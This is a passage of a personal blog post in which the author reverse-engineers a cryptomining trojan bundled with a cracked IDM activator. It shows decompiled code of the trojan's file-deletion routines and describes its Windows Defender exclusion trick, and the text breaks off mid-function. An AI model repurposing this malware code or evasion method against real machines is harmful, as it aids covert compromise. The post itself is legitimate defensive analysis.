<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Analysis of a mining trojan - deb1dong</title><meta name=Description content="Fell victim to a trojan. Got angry, so decided to conduct reverse analysis on it."><meta property="og:title" content="Analysis of a mining trojan"><meta property="og:description" content="Fell victim to a trojan. Got angry, so decided to conduct reverse analysis on it."><meta property="og:type" content="article"><meta property="og:url" content="http://www.debidong.github.io/posts/analysis-of-a-mining-trojan/"><meta property="og:image" content="http://www.debidong.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-11-13T22:00:00+08:00"><meta property="article:modified_time" content="2023-11-13T22:00:00+08:00"><meta property="og:site_name" content="deb1dong"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://www.debidong.github.io/logo.png"><meta name=twitter:title content="Analysis of a mining trojan"><meta name=twitter:description content="Fell victim to a trojan. Got angry, so decided to conduct reverse analysis on it."><meta name=application-name content="deb1dong"><meta name=apple-mobile-web-app-title content="deb1dong"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=http://www.debidong.github.io/posts/analysis-of-a-mining-trojan/><link rel=prev href=http://www.debidong.github.io/posts/writeup-for-orgctf2-crypto/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Analysis of a mining trojan","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/www.debidong.github.io\/posts\/analysis-of-a-mining-trojan\/"},"genre":"posts","keywords":"cybersecurity, Reverse, malware","wordcount":4989,"url":"http:\/\/www.debidong.github.io\/posts\/analysis-of-a-mining-trojan\/","datePublished":"2023-11-13T22:00:00+08:00","dateModified":"2023-11-13T22:00:00+08:00","license":"debidong","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"debidong"},"description":"Fell victim to a trojan. Got angry, so decided to conduct reverse analysis on it."}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=deb1dong>deb1dong</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=deb1dong>deb1dong</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Analysis of a mining trojan</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=www.debidong.github.io title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>debidong</a></span>&nbsp;<span class=post-category>included in <a href=/categories/reverse/><i class="far fa-folder fa-fw" aria-hidden=true></i>Reverse</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-11-13>2023-11-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;4989 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;24 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#0-whole-story>0 Whole story</a></li><li><a href=#1-malware-analysis>1 Malware Analysis</a><ul><li><a href=#11-handlefile>1.1 HandleFile</a></li><li><a href=#12-sub_402fed>1.2 sub_402FED</a></li><li><a href=#13-sub_402c86>1.3 sub_402C86</a></li><li><a href=#14-sub_402b79>1.4 sub_402B79</a></li><li><a href=#15-payloads>1.5 Payloads</a></li></ul></li><li><a href=#2-conclusion>2 Conclusion</a></li><li><a href=#3-link>3 Link</a></li><li><a href=#4-appendix>4 Appendix</a></li></ul></nav></div></div><div class=content id=content><h1 id=analysis-of-a-mining-trojan>Analysis of a mining trojan</h1><p><em>The Comprehensive View of Trojan Operations (Current Analysis Progress)</em></p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/DLL%20injection.png data-srcset="./assets/DLL%20injection.png, ./assets/DLL%20injection.png 1.5x, ./assets/DLL%20injection.png 2x" data-sizes=auto alt=./assets/DLL%20injection.png title="DLL injection"></p><h2 id=0-whole-story>0 Whole story</h2><p>Last weekend, I attempted to install IDM on my ThinkBook laptop and chose to activate IDM using the activation tool from <a href=https://www.crackingcity.com/idm-crack/ target=_blank rel="noopener noreffer">crackingcity</a>.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113193900938.png data-srcset="./assets/image-20231113193900938.png, ./assets/image-20231113193900938.png 1.5x, ./assets/image-20231113193900938.png 2x" data-sizes=auto alt=./assets/image-20231113193900938.png title=image-20231113193900938>It looks like things went smoothly after I downloaded and activated the software. Here&rsquo;s what the activator looks like.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113155404109.png data-srcset="./assets/image-20231113155404109.png, ./assets/image-20231113155404109.png 1.5x, ./assets/image-20231113155404109.png 2x" data-sizes=auto alt=./assets/image-20231113155404109.png title=image-20231113155404109></p><p>After restarting my computer, however, a strange command prompt appeared unexpectedly.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/0bdf06aec6f757897750935c20c13d91.png data-srcset="./assets/0bdf06aec6f757897750935c20c13d91.png, ./assets/0bdf06aec6f757897750935c20c13d91.png 1.5x, ./assets/0bdf06aec6f757897750935c20c13d91.png 2x" data-sizes=auto alt=./assets/0bdf06aec6f757897750935c20c13d91.png title=0bdf06aec6f757897750935c20c13d91></p><p>Whoa! So, after I Googled <code>xmrig.json</code>, turns out my computer caught a mining trojan. It looks like the trojan didn&rsquo;t do its thing properly, hence the weird messages. Then I got curious about why my Windows Defender didn&rsquo;t catch it. Turns out, someone sneaky set <code>C:\\Users\username\AppData</code> as an exclusion for virus scans. When I turned that off, bam! Warning about <code>VScan.exe</code> popped up. I&rsquo;m guessing that&rsquo;s the troublemaker that brought in <code>xmrig</code> to my computer.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/ea4649b94d3d79f018cd74d5a2984eb3.png data-srcset="./assets/ea4649b94d3d79f018cd74d5a2984eb3.png, ./assets/ea4649b94d3d79f018cd74d5a2984eb3.png 1.5x, ./assets/ea4649b94d3d79f018cd74d5a2984eb3.png 2x" data-sizes=auto alt=./assets/ea4649b94d3d79f018cd74d5a2984eb3.png title=ea4649b94d3d79f018cd74d5a2984eb3></p><p>So, I started checking the apps that launch at startup. Something unfamiliar popped up: COM Surrogate? Never seen that before.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/a07801ec88a829c6e093bc11f7c6e24f.png data-srcset="./assets/a07801ec88a829c6e093bc11f7c6e24f.png, ./assets/a07801ec88a829c6e093bc11f7c6e24f.png 1.5x, ./assets/a07801ec88a829c6e093bc11f7c6e24f.png 2x" data-sizes=auto alt=./assets/a07801ec88a829c6e093bc11f7c6e24f.png title=a07801ec88a829c6e093bc11f7c6e24f></p><blockquote><p>The <code>dllhost.exe</code> process goes by the name <em>COM Surrogate</em> and the only time you’re likely even to notice its existence is when it crashes and you get the message <em>COM Surrogate has stopped working</em>. What is this COM Surrogate and why does it keep crashing?</p><p>The COM Surrogate is a fancy name for <em>Sacrificial process for a COM object that is run outside of the process that requested it</em>. Explorer uses the COM Surrogate when extracting thumbnails, for example. If you go to a folder with thumbnails enabled, Explorer will fire off a COM Surrogate and use it to compute the thumbnails for the documents in the folder. It does this because Explorer has learned not to trust thumbnail extractors; they have a poor track record for stability. Explorer has decided to absorb the performance penalty in exchange for the improved reliability resulting in moving these dodgy bits of code out of the main Explorer process. When the thumbnail extractor crashes, the crash destroys the COM Surrogate process instead of Explorer.</p><p><strong>In other words, the COM Surrogate is the <em>I don’t feel good about this code, so I’m going to ask COM to host it in another process. That way, if it crashes, it’s the COM Surrogate sacrificial process that crashes instead of me</em> process. And when it crashes, it just means that Explorer’s worst fears were realized.</strong></p><p>In practice, if you get these types of crashes when browsing folders containing video or media files, the problem is most likely a flaky codec.</p></blockquote><p>Then I quickly went to check it out in the Task Manager to see what it was up to. It had three <code>dllhost</code> instances running, but one of them wasn&rsquo;t from the <code>System32</code> folder—it was from the excluded <code>AppData</code> directory. It was using around 20% of my CPU power.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/705a32f8653a0d4397b514a03cf33dbc.png data-srcset="./assets/705a32f8653a0d4397b514a03cf33dbc.png, ./assets/705a32f8653a0d4397b514a03cf33dbc.png 1.5x, ./assets/705a32f8653a0d4397b514a03cf33dbc.png 2x" data-sizes=auto alt=./assets/705a32f8653a0d4397b514a03cf33dbc.png title=705a32f8653a0d4397b514a03cf33dbc></p><p>I dragged the file into VirusTotal to give it a check:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/31cb53e3401af11698779f9e827d6175.png data-srcset="./assets/31cb53e3401af11698779f9e827d6175.png, ./assets/31cb53e3401af11698779f9e827d6175.png 1.5x, ./assets/31cb53e3401af11698779f9e827d6175.png 2x" data-sizes=auto alt=./assets/31cb53e3401af11698779f9e827d6175.png title=31cb53e3401af11698779f9e827d6175></p><p>Haha, confirmed, it&rsquo;s a mining trojan. Quickly took action, got rid of the mining trojan, adjusted startup items, and reset browser settings. (I wasn&rsquo;t sure if the malware might release something to snatch the passwords saved in Chrome.) Luckily, from the trojan starting its job to me discovering and handling it, didn&rsquo;t take more than five minutes, so it didn&rsquo;t cause much harm. Ran a full scan with Windows Defender, then downloaded a few more scanning tools to make sure there were no other malicious payloads. As of now, the computer seems secure. I don&rsquo;t want to reinstall the system because there&rsquo;s too much in my production environment that needs reconfiguring. But I&rsquo;m still uneasy and pretty annoyed—how can a download site with unanimous positive reviews pull off something like this? To make sure there are no lingering security issues, I&rsquo;ve decided to analyze this handed-to-me-on-a-plate malicious sample.</p><h2 id=1-malware-analysis>1 Malware Analysis</h2><p>Let&rsquo;s review the troubleshooting journey: The mining trojan was mounted on COM Surrogate using DLLs. So, this seems like a DLL injection trojan.</p><p>The simplest way to check the architecture and whether it&rsquo;s packed using DIE is straightforward. The activator is a 32-bit <code>7-zip</code> file. (What&rsquo;s that? Can I understand it as an installation package created by 7zip?)</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/image-20231113204202622.png data-srcset="./assets/image-20231113204202622.png, ./assets/image-20231113204202622.png 1.5x, ./assets/image-20231113204202622.png 2x" data-sizes=auto alt=./assets/image-20231113204202622.png title=image-20231113204202622></p><p>The program is unpacked, great. Let&rsquo;s just drag it into IDA and take a look. The most significant lesson I learned from this debugging session is that if you&rsquo;re unsure about the function of a certain function, you can simply set a breakpoint at the function&rsquo;s return point and dynamically debug to observe changes.</p><p>After IDA finishes its analysis, let&rsquo;s start by checking for any suspicious strings or imported/exported functions. Unfortunately, there doesn&rsquo;t seem to be any valuable information. So, how about running it dynamically to see its behavior? Sadly, dynamic debugging didn&rsquo;t catch any suspicious behavior in the activator&rsquo;s directory. No file creation or registry modifications were detected. The program also doesn&rsquo;t show clear signs of encrypting strings, and I can&rsquo;t see any characters from the previous command prompt interface. Puzzled, I&rsquo;ll have to rely on a combination of static analysis and dynamic debugging for further analysis.</p><p>In the imported functions, the first one that caught my eye was <code>GetFileAttributesW</code>. I traced the cross-references and found this chain of calls. It seems to be involved in file operations. (Later on, it was proven that one of their purposes was likely used to delete some released payloads.)</p><p><code>HandleFile(0x40301A)</code> -> <code>sub_402FED</code> -> <code>sub_402C86</code> -> <code>sub_402B79</code></p><h3 id=11-handlefile>1.1 HandleFile</h3><p>In this function, <code>DWORD FileAttributesW</code> is used to store the file attributes, <code>HANDLE FirstFileW</code> is the file handle for <code>FindFirstFileW</code>, and the struct <code>_WIN32_FIND_DATAW FindFileData</code> is declared to store information about the file. This function checks the attributes of a file specified by <code>lpFileName</code>. If the file is not a directory and certain conditions are met (involving <code>dword_417770</code> and file timestamps), it returns 1, indicating successful file handling. Otherwise, it returns 0 or -1 with an error code.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>HandleFile</span><span class=p>(</span><span class=n>LPCWSTR</span> <span class=n>lpFileName</span><span class=p>,</span> <span class=n>FILETIME</span> <span class=o>*</span><span class=n>lpFileTime2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>DWORD</span> <span class=n>FileAttributesW</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>HANDLE</span> <span class=n>FirstFileW</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>struct</span> <span class=nc>_WIN32_FIND_DATAW</span> <span class=n>FindFileData</span><span class=p>;</span> <span class=c1>// [esp+4h] [ebp-250h] BYREF
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>FileAttributesW</span> <span class=o>=</span> <span class=n>GetFileAttributesW</span><span class=p>(</span><span class=n>lpFileName</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>FileAttributesW</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>FileAttributesW</span> <span class=o>&amp;</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span> <span class=p>)</span> <span class=c1>// if file is a directory
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>SetLastError</span><span class=p>(</span><span class=mh>0x10u</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>dword_417770</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=n>sub_402FED</span><span class=p>(</span><span class=n>lpFileName</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>dword_417770</span> <span class=o>==</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>      <span class=o>&amp;&amp;</span> <span class=p>((</span><span class=n>FirstFileW</span> <span class=o>=</span> <span class=n>FindFirstFileW</span><span class=p>(</span><span class=n>lpFileName</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>FindFileData</span><span class=p>),</span> <span class=n>FirstFileW</span> <span class=o>==</span> <span class=p>(</span><span class=n>HANDLE</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>       <span class=o>||</span> <span class=p>(</span><span class=n>FindClose</span><span class=p>(</span><span class=n>FirstFileW</span><span class=p>),</span> <span class=n>CompareFileTime</span><span class=p>(</span><span class=o>&amp;</span><span class=n>FindFileData</span><span class=p>.</span><span class=n>ftLastWriteTime</span><span class=p>,</span> <span class=n>lpFileTime2</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>))</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=n>sub_402FED</span><span class=p>(</span><span class=n>lpFileName</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=12-sub_402fed>1.2 sub_402FED</h3><p>This function servers like a middleware, calling the following functions in order to delete file(s).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>sub_402FED</span><span class=p>(</span><span class=n>LPCWSTR</span> <span class=n>lpFileName</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>sub_402C86</span><span class=p>(</span><span class=n>lpFileName</span><span class=p>)</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>GetLastError</span><span class=p>()</span> <span class=o>==</span> <span class=mi>5</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>dword_417774</span> <span class=o>&amp;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=13-sub_402c86>1.3 sub_402C86</h3><p>This function deletes file or files in a directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>sub_402C86</span><span class=p>(</span><span class=n>LPCWSTR</span> <span class=n>lpFileName</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>DWORD</span> <span class=n>FileAttributesW</span><span class=p>;</span> <span class=c1>// eax
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>dword_4177F0</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>FileAttributesW</span> <span class=o>=</span> <span class=n>GetFileAttributesW</span><span class=p>(</span><span class=n>lpFileName</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>FileAttributesW</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=n>FileAttributesW</span> <span class=o>&amp;</span> <span class=sc>&#39;\x10&#39;</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span> <span class=p>)</span> <span class=c1>// if file is a directory
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>return</span> <span class=n>sub_402B79</span><span class=p>(</span><span class=n>lpFileName</span><span class=p>);</span> <span class=c1>// traverse and delete sub-files in the directory
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span> <span class=p>(</span> <span class=n>SetFileAttributesW</span><span class=p>(</span><span class=n>lpFileName</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=p>)</span> <span class=c1>// delete the file
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>return</span> <span class=n>DeleteFileW</span><span class=p>(</span><span class=n>lpFileName</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=14-sub_402b79>1.4 sub_402B79</h3><p>This file traverses and deletes sub-files in the directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c++ data-lang=c++><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>sub_402B79</span><span class=p>(</span><span class=n>LPCWSTR</span> <span class=n>lpPathName</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=n>WCHAR</span> <span class=o>*</span><span class=n>v1</span><span class=p>;</span> <span class=c1>// Pointer to store the modified path name
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>HANDLE</span> <span class=n>FirstFileW</span><span class=p>;</span> <span class=c1>// File handle for FindFirstFileW
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// Variable to store function return values
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>struct</span> <span class=nc>_WIN32_FIND_DATAW</span> <span class=n>FindFileData</span><span class=p>;</span> <span class=c1>// Struct to store file information
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>LPCWSTR</span> <span class=n>lpFileName</span><span class=p>[</span><span class=mi>3</span><span class=p>];</span> <span class=c1>// Array to store file names
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=n>sub_4024FC</span><span class=p>(</span><span class=n>lpFileName</span><span class=p>,</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>lpPathName</span><span class=p>);</span> <span class=c1>// Modify the path name
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>sub_40254D</span><span class=p>(</span><span class=sa>L</span><span class=s>&#34;</span><span class=se>\\</span><span class=s>*&#34;</span><span class=p>);</span> <span class=c1>// Append &#34;\\*&#34; to the path name
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>v1</span> <span class=o>=</span> <span class=p>(</span><span class=n>WCHAR</span> <span class=o>*</span><span class=p>)</span><span class=n>lpFileName</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span> <span class=c1>// Assign the modified path name
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>FirstFileW</span> <span class=o>=</span> <span class=n>FindFirstFileW</span><span class=p>(</span><span class=n>lpFileName</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=o>&amp;</span><span class=n>FindFileData</span><span class=p>);</span> <span class=c1>// Get file information for the first file in the directory
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>FirstFileW</span> <span class=o>!=</span> <span class=p>(</span><span class=n>HANDLE</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=c1>// If the directory is not empty
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>sub_401329</span><span class=p>(</span><span class=n>lpFileName</span><span class=p>,</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>lpPathName</span><span class=p>);</span> <span class=c1>// Construct the full path of the file or directory
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>sub_401429</span><span class=p>(</span><span class=mi>92</span><span class=p>);</span> <span class=c1>// Append a backslash character
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>sub_40254D</span><span class=p>(</span><span class=n>FindFileData</span><span class=p>.</span><span class=n>cFileName</span><span class=p>);</span> <span class=c1>// Append the file or directory name to the path
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=n>v1</span> <span class=o>=</span> <span class=p>(</span><span class=n>WCHAR</span> <span class=o>*</span><span class=p>)</span><span class=n>lpFileName</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span> <span class=c1>// Update the modified path name
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>((</span><span class=n>FindFileData</span><span class=p>.</span><span class=n>dwFileAttributes</span> <span class=o>&amp;</span> <span class=mh>0x10</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=c1>// If it&#39;s not a directory
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>      <span class=c1>// If the directory name is not &#34;.&#34; or &#34;..&#34;, recursively call the function
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=k>if</span> <span class=p>(</span><span class=n>lstrcmpW</span><span class=p>(</span><span class=n>FindFileData</span><span class=p>.</span><span class=n>cFileName</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;.&#34;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=n>lstrcmpW</span><span class=p>(</span><span class=n>FindFileData</span><span class=p>.</span><span class=n>cFileName</span><span class=p>,</span> <span class=sa>L</span><span class=s>&#34;..&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>v3</span> <span class=o>=</span> <span class=n>sub_402B79</span><span class=p>(</span><span class=n>v1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>goto</span> <span class=n>LABEL_8</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nl>LABEL_9</span><span class=p>:</span>
</span></span><span class=line><span class=cl>      <span class=c1>// Move to the next file or directory in the directory
</span></span></span><span class=line><span class=cl><span class=c1></span>      <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>FindNextFileW</span><span class=p>(</span><span class=n>FirstFileW</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>FindFileData</span><span class=p>))</span>
</span></span><span class=line><span class=cl>      <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>FindClose</span><span class=p>(</span><span class=n>FirstFileW</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>goto</span> <span class=n>LABEL_11</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// If the file or directory is not a directory, attempt to delete it
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>SetFileAttributesW</span><span class=p>(</span><span class=n>lpFileName</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>      <span class=k>goto</span> <span class=n>LABEL_14</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>v3</span> <span class=o>=</span> <span class=n>DeleteFileW</span><span class=p>(</span><span class=n>v1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nl>LABEL_8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>v3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>      <span class=k>goto</span> <span class=n>LABEL_14</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>LABEL_9</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nl>LABEL_11</span><span class=p>:</span>
